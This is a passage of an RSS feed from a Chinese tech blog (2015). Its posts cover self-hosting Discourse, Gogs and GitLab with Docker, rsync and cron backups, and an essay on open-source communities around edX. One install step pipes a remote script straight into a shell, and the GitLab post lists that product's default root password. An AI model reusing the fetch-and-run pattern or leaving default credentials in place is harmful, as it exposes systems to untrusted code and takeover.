&lt;li&gt;在XBlock里编译:django-admin.py compilemessages&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此外，我觉得软链接那一步应该可有可无，只要进入到virtualenv环境里，不过还没做测试&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;p&gt;&lt;a href="http://www.djangobook.com/en/2.0/chapter19.html"&gt;Internationalization&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 03 Aug 2015 00:00:00 +0000</pubDate><guid>tag:,2015-08-03:XBlocks-I18N.html</guid><category>edx</category></item><item><title>搭建公司内部论坛discourse</title><link>/discourse-install.html</link><description>&lt;p&gt;上周在公司内部搭建好gitlab。不少同事此前用的是svn，我对git可能最为熟悉，老板建议说给大家做个培训，于是整理了一些好的资料。至于解决大家遇到的问题，我倒是更倾向于使用在线问答的形式，所以顺带在公司内部搭建了一个论坛服务，方便大家贴出问题，交流讨论，大多问题一贴代码都解决了。而且方便后来者参考，不必每个问题大家都问一遍。&lt;/p&gt;
&lt;p&gt;文本的可重用性比口头强多了。&lt;/p&gt;
&lt;h1&gt;discourse&lt;/h1&gt;
&lt;p&gt;Discourse是一个为下一个十年的互联网准备的论坛程序。&lt;/p&gt;
&lt;p&gt;使用体验极佳。&lt;/p&gt;
&lt;p&gt;允许直接贴代码，对于技术交流十分方便&lt;/p&gt;
&lt;h1&gt;install docker discourse&lt;/h1&gt;
&lt;p&gt;像上一篇安装gitlab一样，我依然偏好使用docker&lt;/p&gt;
&lt;p&gt;docker的安装就不赘述了&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mkdir /var/discourse
git clone https://github.com/discourse/discourse_docker.git /var/discourse
&lt;span class="nb"&gt;cd&lt;/span&gt; /var/discourse
cp samples/standalone.yml containers/app.yml
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;编辑配置文件&lt;code&gt;containers/app.yml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;初始化：&lt;code&gt;./launcher bootstrap app&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;SMTP邮件服务器部分折腾了挺久，其实一般的qq邮箱就行，需要注意的是使用admin账号将&lt;code&gt;notification email&lt;/code&gt;设置为smtp user email一致&lt;/p&gt;
&lt;p&gt;也可以直接在&lt;code&gt;containers/app.yml&lt;/code&gt;里改：&lt;code&gt;- exec: rails r "SiteSetting.notification_email='xxx@qq.com'"&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#创建管理员&lt;/span&gt;
&lt;span class="nb"&gt;cd&lt;/span&gt; /var/discourse
sudo ./launcher enter app
rake admin:create
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后打开url : &lt;code&gt;/admin/site_settings/category/required&lt;/code&gt;,设置其中的notification email，使其与smtp user email一致。&lt;/p&gt;
&lt;h1&gt;一些可能用得到的操作&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /var/discourse
&lt;span class="c1"&gt;#初始化&lt;/span&gt;
./launcher bootstrap app
&lt;span class="c1"&gt;#rebuild&lt;/span&gt;
./launcher rebuild app
&lt;span class="c1"&gt;#启动&lt;/span&gt;
./launcher start app
&lt;span class="c1"&gt;#停止&lt;/span&gt;
./launcher stop app
&lt;span class="c1"&gt;#更多操作课参考 ./launcher&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/discourse/discourse/blob/master/docs/INSTALL-cloud.md"&gt;INSTALL-cloud&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 03 Aug 2015 00:00:00 +0000</pubDate><guid>tag:,2015-08-03:discourse-install.html</guid><category>技术</category></item><item><title>搭建 gogs 代码托管服务器</title><link>/gogs-install.html</link><description>&lt;p&gt;前头写到搭建好了gitlab，不过没有找到汉化的方法，而且看去界面蛮繁琐的（针对没有使用github的同学而言）。为了降低大家入门门槛，决定使用gogs来搭建代码托管服务器。&lt;/p&gt;
&lt;h1&gt;gogs&lt;/h1&gt;
&lt;p&gt;github上的star截止至15.08.03，已经超过8k。自助安装极其方便，有各个平台的二进制文件，甚至可以轻易搭建在树莓派上&lt;/p&gt;
&lt;h1&gt;install&lt;/h1&gt;
&lt;h2&gt;安装mysql&lt;/h2&gt;
&lt;p&gt;你也可以不安装任何数据库，默认会使用sqlite&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get install mysql-server
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;进入mysql，创建好数据库：&lt;code&gt;CREATE DATABASE gogs;&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;安装gogs&lt;/h2&gt;
&lt;p&gt;采用二进制安装&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget http://gogs.dn.qbox.me/gogs_v0.6.3_linux_amd64.zip
unzip gogs_v0.6.3_linux_amd64.zip
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;run it&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;chmod +x gogs
./gogs web
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;跑起来后进入到一个安装配置页面,邮件服务器的配置需要注意一下端口号，举个栗子：&lt;code&gt;smtp.qq.com:25&lt;/code&gt;.此外注意一下当出现&lt;code&gt;运行系统用户非当前用户&lt;/code&gt;错误是，在配置里填上你运行&lt;code&gt;./gogs web&lt;/code&gt;对应的用户&lt;/p&gt;
&lt;p&gt;如果需要修改配置文件，只要编辑gogs目录下的:&lt;code&gt;custom/conf/app.ini&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;整个过程极其建议&lt;/p&gt;
&lt;p&gt;ps:管理员可以不设置，第一个注册的用户将被认为是管理员&lt;/p&gt;
&lt;p&gt;如果要reinstall，只要把data和custom目录删除即可&lt;/p&gt;
&lt;h2&gt;备份&lt;/h2&gt;
&lt;p&gt;默认情况下，代码仓库在&lt;code&gt;~/gogs-repositories&lt;/code&gt;下，备份的话除了备份数据库(gogs/data)，也注意备份这个目录，推荐使用backup，我在此前的一篇博客里有提到:&lt;a href="http://wwj718.github.io/use-backup-for-edx.html"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;backup的安装非常蛋疼，在ruby1.9中各种出错，还是使用rsync好了&lt;/p&gt;
&lt;h3&gt;使用rsync同步数据&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;配置好ssh免登陆&lt;ul&gt;
&lt;li&gt;ssh-keygen -t dsa&lt;/li&gt;
&lt;li&gt;sudo cp -R .ssh /root/&lt;/li&gt;
&lt;li&gt;ssh-copy-id -i .ssh/id_dsa.pub xx@backup_host&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;本地推送到远程：&lt;code&gt;/usr/bin/rsync -avH  /home/xx/gogs-repositories xx@backup_host:~/backup/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;备份mysql数据    &lt;ul&gt;
&lt;li&gt;/usr/bin/mysqldump -uroot -pxxx gogs &amp;gt; /tmp/gogs.sql  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用cron写定时任务&lt;ul&gt;
&lt;li&gt;&lt;code&gt;00 01 * * * /usr/bin/rsync xxx&lt;/code&gt; （每天凌晨1点同步数据）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;使用Supervisor管理进程&lt;/h1&gt;
&lt;p&gt;参考&lt;a href="http://blog.just4fun.site/process-control-system-supervisor.html"&gt;使用Supervisor来管理进程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;/etc/supervisord.conf.d/&lt;/code&gt;创建&lt;code&gt;gogs.conf&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[program:gogs]

user=wwj
directory=/home/wwj/gogs/gogs
command=/home/wwj/gogs/gogs/gogs web
environment = HOME=&amp;quot;/home/wwj&amp;quot;, USER=&amp;quot;wwj&amp;quot;
autostart=true
autorestart=true
startsecs=10
stdout_logfile=/var/log/gogs/stdout.log
stdout_logfile_maxbytes=1MB
stdout_logfile_backups=10
stdout_capture_maxbytes=1MB
stderr_logfile=/var/log/gogs/stderr.log
stderr_logfile_maxbytes=1MB
stderr_logfile_backups=10
stderr_capture_maxbytes=1MB
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;supervisorctl  restart gogs&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 03 Aug 2015 00:00:00 +0000</pubDate><guid>tag:,2015-08-03:gogs-install.html</guid><category>技术</category></item><item><title>搭建私有 GitLab 代码托管服务器</title><link>/gitlab-install.html</link><description>&lt;p&gt;最近正使用docker给公司内部搭建 GitLab 代码托管服务器&lt;/p&gt;
&lt;h1&gt;Gitlab&lt;/h1&gt;
&lt;p&gt;按照维基百科的说法&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;GitLab实现了一个自托管的Git项目仓库，可通过Web界面进行访问公开的或者私人项目。&lt;br /&gt;
它拥有与GitHub类似的功能，能够浏览源代码，管理缺陷和注释。可以管理团队对仓库的访问，它非常易于浏览提交过的版本并提供一个文件历史库。团队成员可以利用内置的简单聊天程序（Wall）进行交流。它还提供一个代码片段收集功能可以轻松实现代码复用，便于日后有需要的时候进行查找。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;install docker gitlab&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#安装docker（国内）&lt;/span&gt;
curl -sSL https://get.daocloud.io/docker &lt;span class="p"&gt;|&lt;/span&gt; sh
sudo pip install docker-compose
wget https://raw.githubusercontent.com/sameersbn/docker-gitlab/master/docker-compose.yml
&lt;span class="c1"&gt;#vim docker-compose.yml 可以自己更改参数，所有可选参数在这里：https://github.com/sameersbn/docker-gitlab#available-configuration-parameters&lt;/span&gt;
sudo docker-compose up
&lt;span class="c1"&gt;#之后可以把GITLAB_PORT，用ngrok映射到公网。这样不在同个局域网内也可以访问了&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;一些值得注意的参数&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;GITLAB_TIMEZONE = "Asia/Shanghai"&lt;/li&gt;
&lt;li&gt;GITLAB_HOST&lt;/li&gt;
&lt;li&gt;GITLAB_PORT&lt;/li&gt;
&lt;li&gt;GITLAB_ROOT_PASSWORD,默认是5iveL!fe&lt;/li&gt;
&lt;li&gt;GITLAB_BACKUP_DIR，默认是&lt;code&gt;/home/git/data/backups&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;GITLAB_BACKUPS,备份周期，可选disable, daily, weekly or monthly&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;git学习资料&lt;/h1&gt;
&lt;p&gt;以下列出一些我个人觉得比较好的学习资料&lt;/p&gt;
&lt;h3&gt;入门参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Mark24Code/15minGit/blob/master/15minGit.md"&gt;15分钟学会使用Git&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://rogerdudler.github.io/git-guide/index.zh.html"&gt;git - 简明指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000"&gt;Git教程 廖雪峰&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://backlogtool.com/git-guide/cn/intro/intro1_1.html"&gt;猴子都能懂的GIT入门&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://zhengkun.info/2014/10/09/git_usage.html"&gt;Git 常用命令用法：程序员的场景&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;权威参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://git-scm.com/book/zh/v1"&gt;Pro Git&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/sameersbn/docker-gitlab#installation"&gt;github docker-gitlab&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.damagehead.com/docker-gitlab/"&gt;www.damagehead.com docker-gitlab&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 28 Jul 2015 00:00:00 +0000</pubDate><guid>tag:,2015-07-28:gitlab-install.html</guid><category>技术</category></item><item><title>开源、社区、囚徒困境及其他</title><link>/opensource-community-prisoner-dilemma-and-others.html</link><description>&lt;p&gt;亚当斯密在《国富论》中写下&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我们期望的晚餐并非来自屠夫、酿酒师和面包师的恩惠，而是来自他们对自身利益的关切。我们不是向他们乞求仁慈，而是诉诸他们的自利心&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;开源&lt;/h1&gt;
&lt;p&gt;我是一名开源拥趸，从大学起便热衷于参与开源项目以及相关活动，无论线上还是线下。&lt;/p&gt;
&lt;p&gt;上半年刚读完《大教堂与集市》,这本书被大家视其为开源世界的《圣经》，也的确担得起这个赞誉。&lt;/p&gt;
&lt;p&gt;书中关于开源为何取得如此成功的论述,令人震惊。在作者的观察下，技术社区广泛接受开源几乎是理所当然。即便作为经济学上的理性人，也必然会采取这种做法。&lt;/p&gt;
&lt;h3&gt;个人层面&lt;/h3&gt;
&lt;p&gt;作为个人，愿意参与开源，理由是充足的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从这些优秀项目源码中学习编程技巧&lt;/li&gt;
&lt;li&gt;在这些项目基础上开展自己的工作来节省时间，提高工作效率&lt;/li&gt;
&lt;li&gt;通过github与世界各地优秀程序员协作，学习协作工具的使用以及协作方式本身（这比我通过看书来学习git和其他项目管理工具效率高上数倍）&lt;/li&gt;
&lt;li&gt;享受编程的乐趣，而乐趣预示着效率的峰值&lt;/li&gt;
&lt;li&gt;与世界上最好的程序员一起工作，而不是与那些恰巧为他们的公司所雇佣的少数几个程序员一起工作，是一种无与伦比的享受（《大教堂与集市》）&lt;/li&gt;
&lt;li&gt;个人在团体中声望的提升是志愿者活动背后的基本驱动力（同上）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;公司层面&lt;/h3&gt;
&lt;p&gt;可作为逐利的公司，参与其中（目前正如火如荼），乐意贡献自己的代码，我是十分不解的（读这本书之前），它们不怕竞争者吗？它们不怕搭便车吗？它们出于社会责任感吗？出于情怀吗？&lt;/p&gt;
&lt;p&gt;开源运动取得今天的成就,不是因为"开源是道德正确的"或"软件闭源是错误的"，而仅仅是在不断演化的军备竞赛,闭源世界输给了开源社区，因为后者可以在一个问题上，投入比前者多几个数量级的熟练技术工时&lt;/p&gt;
&lt;p&gt;当更多人试用你们的代码，目光聚集的地方，bug是无处隐藏的。&lt;/p&gt;
&lt;p&gt;对于公司而言，公开源代码是利用外部资源的最佳方式。公司开源出自己代码，引起了社区的兴趣，那么对于公司的产品而言，就等同于获得了整个社区的开发力量&lt;/p&gt;
&lt;p&gt;这个项目将不断茁壮，贡献了这个项目的公司，其内部开发者往往也是社区的核心，那么项目解决的需求/痛点首先是该公司最需要解决的。&lt;/p&gt;
&lt;p&gt;当这种收益大过成本和风险时，诸如该技术不涉及公司业务核心，只是基础性的技术工作，联盟中不存在直接竞争对手，或是即便存在对手，但在这个项目上合作是双赢时，这些时候，公司作为经济学上追求自身利益最大化的“理性人”，便有动机这样做。&lt;/p&gt;
&lt;p&gt;实际上，有趣的是，“你已经上船了”，公司的确可以官方申明说不参与，却无法阻止其员工参与，上边列出了个人参与社区的激励因素。社区能提高员工效率，更少的加班，更多的时间陪妹子（假设程序员是有妹子的！尽管是个弱假设），他自然有动机去求助和协作。公司说你不许参与，这种行政式的限制，除了无效，还容易把员工推向竞争对手。&lt;/p&gt;
&lt;p&gt;拥抱趋势往往比抗拒来得明智。&lt;/p&gt;
&lt;p&gt;参与社区的公司，在共同完善他们使用的开源项目，随着项目的完善，得到行业内的认可，最后这个项目可能成为业界首选平台，这实际上是在拓宽他们的市场，而成果往往由成员公司内部分割。&lt;/p&gt;
&lt;p&gt;同时参与社区的开发者们，对该项目已经熟悉，他们都是公司的潜在的雇员啊，连培训成本都免了，这对于开发者匮乏的领域，尤其有利，目前edx用户便是处于这样的境地&lt;/p&gt;
&lt;p&gt;此外公司乐于开源当然还有其他因素：提高公司对开发者的吸引力，让员工获取外部信息，提高他们的效率之类。我相信，肯定也有道德因素，一些优秀的公司出于社会责任感，与回馈社区的热心（毕竟我们用的都是mit和哈佛开源贡献的东西（edx））&lt;/p&gt;
&lt;p&gt;我们在情感上喜欢这些乐于分享的公司，可能的话，也愿意加入他们，不过，道德是用来律己的而不是律人，我们愿意分享却无法要求别人也这样做，道德不是一种健壮的机制，尤其在商业世界，我们应当做的是让大家意识到开源许多时候在经济上也是一件理性行为。&lt;/p&gt;
&lt;p&gt;我们目前也看到国外确实很多围绕edx的公司在贡献自己的工作成果。诸如appsembler，IONISx等。&lt;/p&gt;
&lt;h3&gt;edx与开源&lt;/h3&gt;
&lt;p&gt;edx本身是个开源项目。&lt;br /&gt;
由mit和哈佛大学于2013年6月开放源代码。&lt;br /&gt;
截止到今天（2015.07.18），edx项目组一共建立了106个相关项目，单单为核心组件edx-platform贡献过代码的就有来自世界各地的231人，仅在主分支上就获得31583次commit，被1191个公司或个人fork。&lt;/p&gt;
&lt;h1&gt;社区&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;Community&amp;gt;Code&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这是Apache社区的口号，意思是Community Over Code（社区胜于代码）&lt;/p&gt;
&lt;p&gt;一个开源项目的可用性，很大程度依赖于社区的生态环境，这关系到项目的潜力，项目的健壮性，采用这个项目时，遇到问题能否被及时解决，或者是否可能被解决，是否有足够数量和能力的开发者群体，这些都关系到最终用户是否愿意采用这个开源产品，以及采用这个产品的公司在发展壮大过程中，遇到的技术瓶颈能否被快速解决。&lt;/p&gt;
&lt;p&gt;如果社区健康茁壮，参与其中的开发者的日常工作便十分轻松，遇到问题可以随时解决，参与其中的各家公司在使用该开源产品的时候，节约的远远不止是资金成本，更重要的是时间成本，后者对于初创企业的价值是不可用金钱衡量的&lt;/p&gt;
&lt;h3&gt;edx国内社区现状&lt;/h3&gt;
&lt;p&gt;edx国内社区的现状就是没有国内社区。尽管国内edx用户已经不少，而且据我所知还在不断增加，多数是在埋头而做，重新踩一遍前人踩过所有的坑，花个一年半载的时间，才理清最基本的工作流。&lt;/p&gt;
&lt;p&gt;目前我们能看到的热心分享的开发者并不算多，在群里也都是熟脸：热心于edx的推广的&lt;a href="http://edustack.org/"&gt;@MT兄&lt;/a&gt;,热心于分享技术的&lt;a href="https://idefs.com/"&gt;@竹轩兄&lt;/a&gt;,在群里热心于回答新手问题的&lt;a href="http://www.ui66.com/"&gt;@DatoChen兄&lt;/a&gt;，@萧峰兄，等等，在此不一一列举&lt;/p&gt;
&lt;p&gt;我接触edx较迟（14年），在入门edx之初，除去官方社区的帮助，便是在国内的这些博客中受益最大。&lt;/p&gt;
&lt;p&gt;平时与一些采用或决定采用edx的公司/团队闲聊的时候，他们多数期待有一个可以依赖的社区。这样可以极大降低edx用户的风险，这是是否采用这个产品的重要影响因素。&lt;/p&gt;
&lt;h3&gt;edx社区的必要性&lt;/h3&gt;
&lt;p&gt;上边已经提了很多。再补充一些。&lt;br /&gt;
由于国内网络环境的特殊性，我们在国内使用edx的时候。有许多需要自力更生解决的问题。即便是在难度相对不高的安装门槛上，就让许多公司望而却步，而继续往前的小伙伴，也多是跌跌撞撞，头破血流。&lt;/p&gt;
&lt;p&gt;更遑论本地化相关的东西：主题定制，课程拓展，课件打造(xblock)，购物车，开发数据接口，数据分析和可视化...&lt;/p&gt;
&lt;p&gt;一些强大的功能，edx都为我们打造好了，由于依赖于S3，amazon计算组件，目前在国内多数无法正常使用，这些是本地化的难处所在。&lt;/p&gt;
&lt;p&gt;而这些核心组件的本地化，各个公司之间并不涉及直接的竞争（都是edx公开的源码），而是一根绳上的蚂蚱。mooc平台也不只edx，尽管我认为它是最强大的，可是目前在国内，许多强大的特性拿不来用，那么原本打算采用edx的公司，转而采用外表看去更华丽的mooc平台，这是整个edx用户群的损失。&lt;/p&gt;
&lt;p&gt;那么以上这些基础的工作，是每个公司势单力薄地都踩一遍坑呢，还是集大家的力量，一起提高平台的可用性。&lt;/p&gt;
&lt;h3&gt;社区运作&lt;/h3&gt;
&lt;p&gt;关于社区如何运作，我最初的想法十分简单，几乎觉得这是一件不必多想的事呀，就像大多开源社区那样就好啦，集市一般，大家凭兴趣参与，自由松散，在github上，喜欢你就fork我。&lt;/p&gt;
&lt;p&gt;可是《大教堂与集市》里也提到&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;显然，你不可能从零开始实施集市模式。可以用集市模式测试、排错和完善项目，但以集市模式从零开始一个项目是非常困难的。Linus没有这么试过，我也没有。开发者社区从成立伊始，就需要一个可以运行和测试的东西&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;而目前edx适合国内的生产版本并没有，我此前发布过基于docker的国内开发版本：&lt;a href="http://wwj718.github.io/docker-edx-birch-1.html"&gt;发布基于docker的edx birch-1国内版本&lt;/a&gt;，目前已有数名开发者愿意一起来推进docker版的生产版本&lt;/p&gt;
&lt;p&gt;社区如何起步的问题，其实我们此前都没想好，陆续面对一些质疑，才认真考虑这个问题。&lt;/p&gt;
&lt;p&gt;这些质疑主要集中在：如何保证这样一种松散的组织能高效的运作，尤其在最艰难的初期；如何应对参与各方的利益冲突；如何保证核心开发者在受到利益诱惑的时候，不会中途跑路。&lt;/p&gt;
&lt;p&gt;@yuquan兄大半月前同我说的openstack国内社区核心人员的聚散，令人唏嘘。这些都是不得不面对的问题。&lt;/p&gt;
&lt;p&gt;我们还面临以下问题&lt;/p&gt;
&lt;h1&gt;囚徒困境&lt;/h1&gt;
&lt;p&gt;这里主要谈论参与社区的各家公司之间的博弈。&lt;/p&gt;
&lt;p&gt;我们知道，长期协作对社区参与者群体是有益的，纳什均衡趋于帕累托最优，可是对于参与协作的各方（公司），在寻求自身利益的最大化的时候（无可厚非），存在这样一种激励：获取社区成果的同时，不对外贡献。这样一来在获得到他人成果的同时，还保留了自己的私货。&lt;/p&gt;
&lt;p&gt;这显然是协作中对每个参与公司而言的最佳策略。&lt;/p&gt;
&lt;p&gt;这种行为，最糟糕的地方，不在于自私，而是如此一来会极大打击贡献者的意愿，最后的结果便是社区逐渐萎靡。&lt;/p&gt;
&lt;p&gt;国外的情况有些不同，往往是大公司开源基础组件，社区去完善它，有核心团队支持，有资金支持，有热心且时间充裕的编程爱好者，如此一来激励因素变得多元。&lt;/p&gt;
&lt;p&gt;而目前我们的境地是，edx门槛不低，又不是通用的技术，注定小众，有开发能力的参与者，多数分布在各个以此为产品的公司，纯粹的编程爱好者是十分少见的，如此一来，对公司的激励因素就很容易造成囚徒困境。&lt;/p&gt;
&lt;p&gt;我们知道，囚徒困境的解决方案之一是重复博弈，重复博弈后的结果就是趋于合作。&lt;/p&gt;
&lt;p&gt;那么如何形成重复博弈的局面呢&lt;/p&gt;
&lt;p&gt;对于以上的这些问题，在与一些热心开发者以及部分公司交流中，我们大致理出了以下的框架&lt;/p&gt;
&lt;h1&gt;基金会&lt;/h1&gt;
&lt;p&gt;初期我们需要保证事情的效率，在推出本土化的社区版之前，松散的协作方式并不合适,也许我们需要一个基金会来推动它&lt;/p&gt;
&lt;p&gt;成立基金会的动机有很多：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;独立于任何一家公司的控制&lt;/li&gt;
&lt;li&gt;参与社区的公司，通过基金会赞助社区。社区以此做一些基础性的事务，诸如：&lt;ul&gt;
&lt;li&gt;社区购买国外测试服务器，每周定期安装edx-platform，这样各个公司不需要定期安排人员去跟踪新特性，这样节约大量资金和时间&lt;/li&gt;
&lt;li&gt;推进社区发布版，在官方发布新的稳定版的时候（好比最近准备发布的Cypress版），保持跟新，负责将edx社区版update到新版本上，愿意尝试新特性的人，只需要docker pull下来就行，复杂度都移交给了社区&lt;/li&gt;
&lt;li&gt;可以随时建立小分队，利用开发者的业余时间，对一些难啃的基础问题进行攻克，诸如数据分析和可视化，相信这些特性大家都垂涎很久了。&lt;/li&gt;
&lt;li&gt;文档翻译和汉化的问题，也可以由社区赞助来推动，目前@MT号召学生在做这件事，如果社区愿意赞助他们的话，支付的成本并不高，却可以获得实时跟进的汉化版本，而各个公司不必再为此费心&lt;/li&gt;
&lt;li&gt;此类基础性的工作还有许多，通过社区赞助的方式，让大多数公司能够从这些琐事脱身，而专注在各自的业务领域&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对核心贡献者予以激励,防止其中途被拐跑。个人爱好者业余时间的参与若能获得相应激励，其对推动项目的意义可能大于大多全职人员。&lt;/li&gt;
&lt;li&gt;如此一来，在最坏的情况下（开发者们参与热情不高），也至少能通过调整激励机制，使这件事不至于夭折。而一旦初期稳定版本形成，社区很可能就围绕它进入良性循环了&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;公司为何愿意参与基金会&lt;/h3&gt;
&lt;p&gt;实际上是调整对公司的激励因素。&lt;/p&gt;
&lt;p&gt;它们将获得如下收益：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;优先获得社区的技术支持。支付不到一名开发者的成本，获得的往往是超过一整支优秀团队的技术回报&lt;/li&gt;
&lt;li&gt;搭建国外代理服务器，用于方便国内服务器安装edx，由于资源有限，各个公司在赞助社区的同时，优先获得这些便利资源，来节约时间成本和降低开发难度&lt;/li&gt;
&lt;li&gt;参与社区日常任务的起草与计划&lt;/li&gt;
&lt;li&gt;作为内测成员，最先取得项目的进展和特性&lt;/li&gt;
&lt;li&gt;方便各方在不涉及业务的前提下，交换经验，各自增强自己的平台，我相信在群里热衷于交流的公司已经体会到这种甜头了&lt;/li&gt;
&lt;li&gt;一些可参考方案（为了克服囚徒困境），诸如每年评估参与公司对社区的贡献（赞助社区的热心已经贡献源码反馈bug的热心）来调整基金会成员&lt;/li&gt;
&lt;li&gt;and so on&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;大体先这样，大家觉得需要吐槽的地方,不用顾虑，我心里素质很好哒，发我邮件，或是在群里直接吐槽都好: )&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 18 Jul 2015 00:00:00 +0000</pubDate><guid>tag:,2015-07-18:opensource-community-prisoner-dilemma-and-others.html</guid><category>edx</category></item><item><title>架构风格与基于网络的软件架构设计</title><link>/Architectural-Styles-and-the-Design-of-Network-based%20Software-Architectures.html</link><description>&lt;p&gt;花了两天读Roy Thomas Fielding这篇著名的博士论文，度过了一个智商欠费的周末（其实获益匪浅啦）。最初翻的是英文版，由于英文渣渣的缘故，只好读中文版了（说好的坚持阅读英文文献呢orz）&lt;/p&gt;
&lt;p&gt;Roy Thomas Fielding 有多屌呢，下边是维基百科的介绍&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;one of the principal authors of the HTTP specification, an authority on computer network architecture[2] and co-founder of the Apache HTTP Server project.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;作者在绪论中提到他的动机是希望理解和评估基于网络应用软件的架构设计,通过有原则地使用架构约束,从而从架构中获得所期待的功能、性能和社交三方面的属性。&lt;/p&gt;
&lt;p&gt;一种架构风格是一组已命名的、相互协作的架构约束。&lt;/p&gt;
&lt;p&gt;每一个对REST架构感兴趣的人都值得亲自翻阅呢&lt;/p&gt;
&lt;p&gt;---摘自Roy Thomas Fielding《架构风格与基于网络的软件架构设计》---&lt;/p&gt;
&lt;p&gt;waiting&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 13 Jul 2015 00:00:00 +0000</pubDate><guid>tag:,2015-07-13:Architectural-Styles-and-the-Design-of-Network-based Software-Architectures.html</guid><category>book</category></item><item><title>关于XBlocks</title><link>/about-XBlocks.html</link><description>&lt;blockquote&gt;
&lt;p&gt;机制,而不是策略  --《Unix编程艺术》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;偶尔收到一些开发者邮件说，想扩展edx平台本身的功能，其中多数的需求，其实都可以通过&lt;a href="https://github.com/edx/XBlock"&gt;XBlock&lt;/a&gt;来实现，我就建议说你去看看XBlock吧，这种做法很可能也是移植性最好而侵入性最小的。&lt;/p&gt;
